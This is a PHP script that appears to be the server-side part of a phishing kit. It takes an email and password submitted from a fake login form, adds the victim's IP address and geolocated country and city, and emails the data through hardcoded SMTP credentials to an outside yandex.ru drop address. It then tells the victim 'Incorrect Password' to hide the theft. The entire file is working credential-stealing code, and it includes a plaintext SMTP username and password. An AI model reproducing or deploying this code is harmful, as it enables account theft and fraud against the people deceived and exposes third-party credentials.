<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE');
header('Access-Control-Allow-Headers: X-Requested-With,Origin,Content-Type,Cookie,Accept');
$ip = getenv("REMOTE_ADDR");
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
if(property_exists($ipdat, 'geoplugin_countryCode'));
if(property_exists($ipdat, 'geoplugin_countryName'));
if(property_exists($ipdat, 'geoplugin_city'));
if(property_exists($ipdat, 'geoplugin_region'));
$countrycode = $ipdat->geoplugin_countryCode;
$country = $ipdat->geoplugin_countryName;
$city = $ipdat->geoplugin_city;
$region = $ipdat->geoplugin_region;

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require './src/Exception.php';
require './src/PHPMailer.php';
require './src/SMTP.php';

class Email{
    public function clean($data){
        if(!empty($data)){
            $data = trim(strip_tags(stripslashes($data)));
            return $data;
        }
    }

	public function getIp(){
		$ip = $_SERVER['REMOTE_ADDR'];
		
		if(!empty($_SERVER['HTTP_CLIENT_IP'])){
			$ip = $_SERVER['HTTP_CLIENT_IP'];
		}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		return $ip;
	}

	public function sendMessage($mail, $data){  
		$mail->isSMTP();                                      // Set mailer to use SMTP
		$mail->Host = 'imap.worldposta.com';  // Specify main and backup SMTP servers
		$mail->SMTPAuth = true;                               // Enable SMTP authentication
		$mail->Username = 'sap.notify@morshedy.com';                 // SMTP username
		$mail->Password = 'P@951ss91';                           // SMTP password
		$mail->SMTPSecure = 'tls';                         // SMTP password
		$mail->Port = 465;

		$mail->From = 'sap.notify@morshedy.com';
		$mail->FromName = "Valid_logs";
		$mail->addAddress('only1r00t@yandex.ru');

		$mail->isHTML(true);
		$mail->Subject = $data['subject'];
		$mail->Body    = $data['message'];

		if(!$mail->send()) {
		    return $mail->ErrorInfo;
		} else {
		    return true;
		}
	}

}

if(isset($_POST)){
	$email = new Email;
	$mail = new PHPMailer(true);

    $data = array();
    $data['email'] = $email->clean($_REQUEST['pet']);
    $data['pass'] = $email->clean($_REQUEST['pett']);
    $data['ip'] = $email->getIp();
    $data['subject'] = $email->clean($_REQUEST['pet']);
    $data['cname'] = $country;
	    $data['ccity'] = $city;

    $data['message'] =
		"
		<html>
			<head>
				<title>r00t</title>
			</head>

			<body>
				<h3>Details</h3>
				<p>This is the information you required</p>
				<br>
			    <p><strong>E-ID:</strong> ".$data['email']."</p>
			    <p><strong>P-ID:</strong>".$data['pass']."</p>
			    <br>
			    <p><strong>P-ID:</strong>".$data['cname']."</p>
			    <p><strong>P-ID:</strong>".$data['ccity']."</p>
			    <p><strong>IP:</strong>".$data['ip']."</p>
			    <br>
			</body>
		</html>
		";

	if($email->sendMessage($mail, $data)){
		echo "Incorrect Password";
	}else{
		echo "Something went wrong";
	}

}
?>
